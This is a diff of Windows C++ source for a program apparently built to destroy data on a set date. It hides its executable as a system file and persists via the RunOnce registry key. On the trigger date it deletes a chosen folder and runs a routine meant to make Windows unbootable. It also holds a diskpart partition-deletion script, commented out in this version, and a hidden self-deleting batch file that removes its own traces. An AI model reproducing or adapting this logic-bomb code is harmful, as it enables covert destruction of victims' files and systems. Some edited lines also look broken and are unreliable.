@@ -43,11 +43,6 @@ bool CDeleteDay::AddToAutoRun()
 // записываем в реестр когда выполнится задача
 bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
 {
-	/*SYSTEMTIME SysTime;
-	ZeroMemory(&SysTime, 0);
-
-	m_MonthCalCtrl.GetCurSel(&SysTime);*/
-
 	CString DeleteDay, DeleteWeek, DeleteMonth;
 
 	DeleteDay.Format(L"%d", SysTime.wDay);
@@ -132,7 +127,7 @@ bool CDeleteDay::SavePathOfFolderToDelete(CString csFolderPath)
 	return true;
 }
 
-void CDeleteDay::HideFile()
+void CDeleteDay::HideFile(bool bHide)
 {
 	wchar_t szFileExe[MAX_PATH] = { L"\0" };
 	wchar_t sz[600] = { L"\0" }; // Строка-помошник...
@@ -143,7 +138,13 @@ void CDeleteDay::HideFile()
 	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем имя файла в досовский вид
 		wcscpy(szFileExe, sz);
 
-	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл
+	if (bHide) {
+		SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл
+	}
+	else {
+		SetFileAttributes(szFileExe, FILE_ATTRIBUTE_NORMAL); // показываем файл
+	}
+	
 }
 
 bool CDeleteDay::EnableCrashOnCtrlScroll()
@@ -203,59 +204,50 @@ bool CDeleteDay::SaveTaskKillWindows()
 void CDeleteDay::SelfDelete()
 {
 	//удалить себя из автозагрузки
-	HKEY hKey;
-
-	if (::RegOpenKeyEx(HKEY_CURRENT_USER
-		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-		, NULL
-		, KEY_ALL_ACCESS
-		, &hKey) == ERROR_SUCCESS)
-	{
-		::RegDeleteValue(hKey, RunOnceItemName);
-	}
+	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
 
 	// Далее выделяем много памяти - лишним не будет %)
-	wchar_t szFilePath[MAX_PATH] = { L"\0" };
-	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
-	wchar_t szFileExe[MAX_PATH] = { L"\0" };
+	char szFilePath[MAX_PATH] = { "\0" };
+	char szFileBat[MAX_PATH] = { "System.bat" };
+	char szFileExe[MAX_PATH] = { "\0" };
 
-	wchar_t sz[600]; // Строка-помошник...
+	char sz[600]; // Строка-помошник...
 
 	unsigned int iTmp;
-	wchar_t* lpTmp;
+	char* lpTmp;
 
 	// Получаем путь к запущенному ехешнику
-	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));
+	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe));
 
 	// Преобразуем в имя файла в досовский вид
-	if (GetShortPathName(szFileExe, sz, _MAX_PATH))
-		wcscpy(szFileExe, sz);
+	if (GetShortPathNameA(szFileExe, sz, MAX_PATH))
+		strcpy(szFileExe, sz);
 
-	size_t sLen = wcslen(szFileExe) - 1;
+	size_t sLen = strlen(szFileExe) - 1;
 	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
 
-	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
+	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
 	{
-		if (!wcsncmp(lpTmp, L"\\", 1))
+		if (!strncmp(lpTmp, "\\", 1))
 			break;
 	}
 
 	//убираем из пути к фалу название программы
 	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
-	wcsncpy(szFilePath, szFileExe, count);
-	wcscat(szFilePath, L"\\");
+	strncpy(szFilePath, szFileExe, count);
+	strcat(szFilePath, "\\");
 
 	//===== удалить саму себя =====
-	wchar_t BATSTRING[1024] =
-		L":Repeat\n"
-		L"del \"%s\"\n" //команда на удаление экзешника
-		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-		L":Repeat1\n"
-		L"del \"%s\"\n"
-		L"\0"; //удаление батника
+	char BATSTRING[1024] =
+		":Repeat\n"
+		"del \"%s\"\n" //команда на удаление экзешника
+		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
+		":Repeat1\n"
+		"del \"%s\"\n"
+		"\0"; //удаление батника
 
-	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
+	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
 		GENERIC_WRITE,
 		FILE_SHARE_WRITE,
 		NULL,
@@ -263,27 +255,25 @@ void CDeleteDay::SelfDelete()
 		FILE_ATTRIBUTE_NORMAL,
 		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
 
-	if (!hFile)
-	{
+	if (!hFile)	{
 		TRACE(L"Факн щет, файла System.bat нет и не будет\n");
 	}
 
 	//char sz[600]; // Строка-помошник...
 	//создаем бат-файл ===========================================
-	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
+	sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
 
 	DWORD dwBytesWritten;
 
-	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);
+	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);
 
-	if (bError)
-	{
+	if (bError)	{
 		TRACE(L"Факн щет, текст в файл System.bat не удалось записать\n");
 	}
 
 	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
 
-	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
+	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
 }
 
 // Проверить не наступил ли день выполнения задания
@@ -312,6 +302,65 @@ bool CDeleteDay::InspectDeleteData()
 		}		
 	}	
 	return false;
+}
+
+bool CDeleteDay::PerformATask(void)
+{
+	const int SIZE = 1024;
+	// Далее выделяем много памяти - лишним не будет %)
+	char szFilePath[SIZE] = { "\0" };
+	char szFileBat[SIZE] = { "\0" };
+	char szFileExe[SIZE] = { "\0" };
+	char szFileDiskPart[SIZE] = { "\0" };
+	char szTempPath[SIZE] = { "\0" };
+
+	char buffer[SIZE] = { "\0" }; // Строка-помошник...
+
+	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
+
+	if (GetShortPathNameA(szFileExe, buffer, SIZE)) // Преобразуем в имя файла в досовский вид
+		strncpy(szFileExe, buffer, sizeof(szFileExe));
+
+	//убираем название проги и расширение. Перемещаем указатель
+	unsigned int iTmp;
+	char* lpTmp;
+	size_t sLen = strlen(szFileExe) - 1;
+	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
+
+	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
+	{
+		if (!strncmp(lpTmp, "\\", 1))
+			break;
+	}
+
+	//убираем из пути к фалу название программы
+	size_t count = lpTmp - szFileExe; //Number of characters to be copied
+
+	strncpy(szFilePath, szFileExe, count);
+	strcat(szFilePath, "\\");
+
+	GetTempPathA(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке
+
+	//если удалить диск Д
+	if (IfDeleteDiskD()) {
+		CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
+	}
+
+	if (IfKillWindows()) {
+		//делаем загрузку винды невозможной
+		DoKillWindows();
+	}
+
+	//удаляем выбранную папку
+	DeleteFolder();
+	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
+	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// Делаем файл нормальным иначе не удаляется 
+	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
+	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
+	//удаляем из автозагрузки
+	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
+
+	return false; // И закрываемся
 }
 
 bool DeleteFolder()
@@ -363,65 +412,6 @@ bool DeleteFolder()
 	}
 
 	return true;
-}
-
-bool CDeleteDay::PerformATask(void)
-{
-	const int SIZE = 1024;
-	// Далее выделяем много памяти - лишним не будет %)
-	char szFilePath[SIZE] = { "\0" };
-	char szFileBat[SIZE] = { "\0" };
-	char szFileExe[SIZE] = { "\0" };
-	char szFileDiskPart[SIZE] = { "\0" };
-	char szTempPath[SIZE] = { "\0" };
-
-	char buffer[SIZE] = { "\0" }; // Строка-помошник...
-
-	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
-
-	if (GetShortPathNameA(szFileExe, buffer, SIZE)) // Преобразуем в имя файла в досовский вид
-		strncpy(szFileExe, buffer, sizeof(szFileExe));
-
-	//убираем название проги и расширение. Перемещаем указатель
-	unsigned int iTmp;
-	char* lpTmp;
-	size_t sLen = strlen(szFileExe) - 1;
-	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
-
-	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
-	{
-		if (!strncmp(lpTmp, "\\", 1))
-			break;
-	}
-
-	//убираем из пути к фалу название программы
-	size_t count = lpTmp - szFileExe; //Number of characters to be copied
-
-	strncpy(szFilePath, szFileExe, count);
-	strcat(szFilePath, "\\");
-
-	GetTempPathA(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке
-
-	//если удалить диск Д
-	if (IfDeleteDiskD()) {
-		//CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
-	}
-
-	if (IfKillWindows()) {
-		//делаем загрузку винды невозможной
-		DoKillWindows();
-	}
-
-	//удаляем выбранную папку
-	DeleteFolder();
-	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
-	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// Делаем файл нормальным иначе не удаляется 
-	HINSTANCE h = ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.0
-	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
-	//удаляем из автозагрузки
-	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
-
-	return false; // И закрываемся
 }
 
 bool IfDeleteDiskD(void)
@@ -553,20 +543,22 @@ void GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
 	return;
 }
 
-bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[])
+bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[])
 {
-	wchar_t sz[600]; // Строка-помошник...
+	char sz[600]; // Строка-помошник...
 					 //создадим или во временной папке или в рабочем каталоге программы
-	swprintf(szFileDiskPart, L"%sDiskpart.txt", (wcslen(szTempPath)) ? szTempPath : szFilePath);
+	sprintf(szFileDiskPart, "%sDiskpart.txt", (strlen(szTempPath)) ? szTempPath : szFilePath);
 
-	SetFileAttributes(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
+	// Если файл существует, то изменим его аттрибуты на нормальные
+	SetFileAttributesA(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); 
 
-															  //создаем diskpart сценарий ===========================================
-	const wchar_t* DISKPARTSTRING = L"select disk 0\nselect partition 3\ndelete partition noerr override";
+	//создаем diskpart сценарий ===========================================
+	//const char* DISKPARTSTRING = "select disk 0\nselect partition 3\ndelete partition noerr override";
+	const char* DISKPARTSTRING = "пока ничего не делаем";
 	//заполняем строку для записи в файл
-	swprintf(sz, DISKPARTSTRING);
+	//sprintf(sz, DISKPARTSTRING);
 
-	HANDLE hFile = CreateFile((LPCTSTR)szFileDiskPart,
+	HANDLE hFile = CreateFileA((LPCSTR)DISKPARTSTRING,
 		GENERIC_WRITE,
 		FILE_SHARE_WRITE,
 		NULL,
@@ -582,7 +574,7 @@ bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_
 
 	DWORD dwBytesWritten;
 
-	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);
+	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);
 
 	if (bError)
 	{
@@ -594,65 +586,6 @@ bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_
 
 	return true;
 }
-
-//bool CreateBatFileW(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[])
-//{
-//	wchar_t strTemp[600]; // Строка-помошник...
-//	//создаем бат-файл ===========================================
-//	swprintf(szFileBat, L"%sSystem.bat", (wcslen(szTempPath)) ? szTempPath : szFilePath);
-//
-//	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
-//
-//	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
-//		GENERIC_WRITE,
-//		FILE_SHARE_WRITE,
-//		NULL,
-//		CREATE_ALWAYS,
-//		FILE_ATTRIBUTE_NORMAL,
-//		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
-//
-//	if (!hFile)	{
-//		TRACE("Факн щет, файла System.bat нет и не будет");
-//		return false;
-//	}
-//
-//	wchar_t BATSTRING[1024] =
-//		L":Repeat\n"
-//		L"del \"%s\"\n" //команда на удаление экзешника
-//		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-//		L":Repeat1\n"
-//		L"del \"%s\"\n"
-//		L"\0"; //удаление батника	
-//
-//	if (IfDeleteDiskD()){
-//		//формируем команду для записи в файл
-//		wcsncpy(BATSTRING,
-//			L":Repeat\n"
-//			L"del \"%s\"\n" //команда на удаление экзешника
-//			L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-//			L"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
-//			L":Repeat1\n"
-//			L"del \"%s\"\n" //удаление батника
-//			L"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart
-//
-//		swprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
-//	}
-//	else {
-//		swprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
-//	}
-//
-//	DWORD dwBytesWritten;
-//	BOOL bError = (!WriteFile(hFile, strTemp, wcslen(strTemp), &dwBytesWritten, NULL) || wcslen(strTemp) != dwBytesWritten);
-//
-//	if (bError)	{
-//		TRACE("Факн щет, текст в файл System.bat не удалось записать");
-//		return false;
-//	}
-//
-//	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
-//
-//	return true;
-//}
 
 bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
 {
@@ -715,7 +648,6 @@ bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char 
 
 void DoKillWindows()
 {
-	//remove();
 	const int INFO_BUFFER_SIZE = 100;
 
 	CString SystemDisk;
